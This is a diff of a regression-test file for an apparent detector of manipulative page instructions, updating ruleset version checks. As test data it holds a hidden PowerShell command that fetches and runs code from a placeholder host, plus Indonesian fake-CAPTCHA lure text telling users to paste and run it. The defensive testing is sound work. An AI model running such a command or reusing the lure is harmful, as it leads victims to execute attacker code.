@@ -1,15 +1,15 @@
 // M4.1 regression tests. The default (M1) model must be unchanged; ruleset 'm4.1-rc1' is the candidate.
 // Cases marked KNOWN LIMITATION pin current behavior we consider wrong, so future changes are visible.
 import { describe, expect, it } from 'vitest';
-import { analyze as coreAnalyze, ENGINE_VERSION, ENGINE_VERSION_M1 } from '../src/core/index.js';
+import { analyze as coreAnalyze, ENGINE_VERSION, ENGINE_VERSION_M1, ENGINE_VERSION_M41 } from '../src/core/index.js';
 import type { AnalysisResult, AnalyzeOptions, PageSnapshot } from '../src/core/types.js';
 
-// `analyze` = M1 baseline (explicit ruleset 'm1'); `rc` = the M4.1 rule set, the production default since M4.3A.
+// `analyze` = M1 baseline (explicit ruleset 'm1'); `rc` = the M4.1 rule set (engine 0.2.0, production default from M4.3A until m5).
 const analyze = (s: PageSnapshot, o: AnalyzeOptions = {}): AnalysisResult => coreAnalyze(s, { ruleset: 'm1', ...o });
 import { inContainer, snapshot } from './fixtures/build.js';
 import { KNOWN_LIMITATIONS, SCENARIOS } from './fixtures/scenarios.js';
 
-const rc = (s: PageSnapshot): AnalysisResult => coreAnalyze(s);
+const rc = (s: PageSnapshot): AnalysisResult => coreAnalyze(s, { ruleset: 'm4.1' });
 const rules = (r: AnalysisResult) => r.findings.map((f) => `${f.ruleId}:${f.classification}`);
 const DIALOG = { dialog: true };
 const OVERLAY = { overlay: true };
@@ -17,7 +17,7 @@ const ARTICLE = { article: true };
 const CODE = { article: true, pre: true, code: true };
 const STAGED = 'powershell -w hidden -c "iex(irm https://x.example.invalid/p)"';
 
-describe('engine adoption (M4.3A): default = ruleset m4.1, engine 0.2.0; M1 still selectable', () => {
+describe('rule sets: m4.1 (engine 0.2.0) and M1 stay selectable; the default is m5 (engine 0.3.0, D-083)', () => {
   it('ruleset m1 reports the M1 engine and has no overrides field', () => {
     for (const sc of [...SCENARIOS, ...KNOWN_LIMITATIONS]) {
       const r = analyze(sc.snapshot);
@@ -26,14 +26,15 @@ describe('engine adoption (M4.3A): default = ruleset m4.1, engine 0.2.0; M1 stil
     }
   });
 
-  it('the default equals ruleset m4.1 and the legacy alias m4.1-rc1, and reports engine 0.2.0', () => {
+  it('ruleset m4.1 and its alias m4.1-rc1 report engine 0.2.0; the default reports engine 0.3.0 and equals ruleset m5', () => {
+    expect(ENGINE_VERSION).toBe('0.3.0');
+    expect(ENGINE_VERSION_M41).toBe('0.2.0');
     for (const sc of [...SCENARIOS, ...KNOWN_LIMITATIONS]) {
       const d = rc(sc.snapshot);
-      expect(d.engineVersion).toBe(ENGINE_VERSION);
-      expect(ENGINE_VERSION).toBe('0.2.0');
-      expect(coreAnalyze(sc.snapshot, { ruleset: 'm4.1' })).toEqual(d);
+      expect(d.engineVersion).toBe('0.2.0');
       expect(coreAnalyze(sc.snapshot, { ruleset: 'm4.1-rc1' })).toEqual(d);
-      expect(rc(sc.snapshot)).toEqual(d);
+      expect(coreAnalyze(sc.snapshot).engineVersion).toBe('0.3.0');
+      expect(coreAnalyze(sc.snapshot)).toEqual(coreAnalyze(sc.snapshot, { ruleset: 'm5' }));
     }
   });
 
@@ -184,9 +185,9 @@ describe('KNOWN LIMITATIONS under rc1 (documented, not desired)', () => {
     expect(rc(s).verdict).toBe('observed_instruction');
   });
 
-  it('very informal Indonesian paraphrase is outside the lexicon', () => {
+  it('very informal Indonesian paraphrase: covered since the m5 lexicon ("sama" as a key separator, "konfirmasi dulu kamu")', () => {
     const s = snapshot(inContainer('g', ['Konfirmasi dulu kamu bukan robot ya', 'Pencet tombol Windows sama R barengan', 'Terus pencet Ctrl sama V', 'Abis itu pencet Enter'], OVERLAY));
-    expect(['none', 'observed_instruction']).toContain(rc(s).verdict);
+    expect(rc(s).verdict).toBe('manipulative_instruction');
   });
 });
 
